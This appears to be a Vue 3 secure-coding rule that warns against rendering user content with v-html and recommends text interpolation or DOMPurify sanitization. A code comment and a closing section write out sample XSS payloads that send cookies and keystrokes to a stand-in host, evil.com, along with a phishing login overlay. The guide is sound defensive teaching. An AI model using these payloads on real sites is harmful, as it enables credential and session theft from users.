---
title: Never Use v-html with User-Provided Content
impact: HIGH
impactDescription: Using v-html with untrusted content leads to XSS vulnerabilities
type: capability
tags: [vue3, security, xss, v-html, template]
---

# Never Use v-html with User-Provided Content

**Impact: HIGH** - Dynamically rendering arbitrary HTML with `v-html` can lead to Cross-Site Scripting (XSS) vulnerabilities. Attackers can inject malicious scripts that execute in users' browsers, stealing credentials or performing actions on their behalf.

The `v-html` directive renders raw HTML without sanitization. While useful for trusted content, it bypasses Vue's automatic text escaping and should never be used with user input.

## Task Checklist

- [ ] Never use `v-html` with user-provided content
- [ ] Prefer text interpolation `{{ }}` which automatically escapes HTML
- [ ] Use components for template composition instead of `v-html`
- [ ] If raw HTML is absolutely needed, sanitize it with a library like DOMPurify
- [ ] Audit existing `v-html` usage for potential XSS vectors

**Incorrect:**
```vue
<template>
  <!-- DANGEROUS: User input rendered as HTML -->
  <div v-html="userComment"></div>

  <!-- DANGEROUS: Content from API without sanitization -->
  <article v-html="articleContent"></article>

  <!-- DANGEROUS: URL parameters or form inputs -->
  <p v-html="searchQuery"></p>
</template>

<script setup>
import { ref } from 'vue'

// This could contain: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
const userComment = ref(props.comment)
</script>
```

**Correct:**
```vue
<template>
  <!-- SAFE: Text interpolation escapes HTML -->
  <div>{{ userComment }}</div>

  <!-- SAFE: Use components for rich content -->
  <CommentRenderer :content="userComment" />

  <!-- SAFE: Only use v-html with trusted, sanitized content -->
  <div v-html="sanitizedContent"></div>
</template>

<script setup>
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps(['comment', 'trustedHtml'])

// Option 1: Use text interpolation (recommended)
const userComment = computed(() => props.comment)

// Option 2: Sanitize if raw HTML is truly needed
const sanitizedContent = computed(() =>
  DOMPurify.sanitize(props.trustedHtml)
)
</script>
```

## When v-html Is Acceptable

```vue
<template>
  <!-- OK: Static HTML from your own codebase -->
  <div v-html="staticLegalDisclaimer"></div>

  <!-- OK: Content from trusted CMS with sanitization -->
  <article v-html="sanitizedCmsContent"></article>
</template>

<script setup>
// Content you control, not user input
const staticLegalDisclaimer = `
  <p>Terms and conditions apply.</p>
  <a href="/legal">Read more</a>
`
</script>
```

## XSS Attack Examples

Attackers can inject various payloads:
```html
<!-- Cookie theft -->
<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">

<!-- Keylogging -->
<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>

<!-- Phishing overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%">
  <form action="https://evil.com/steal">Login required...</form>
</div>
```

## Reference
- [Vue.js Template Syntax - Raw HTML](https://vuejs.org/guide/essentials/template-syntax.html#raw-html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
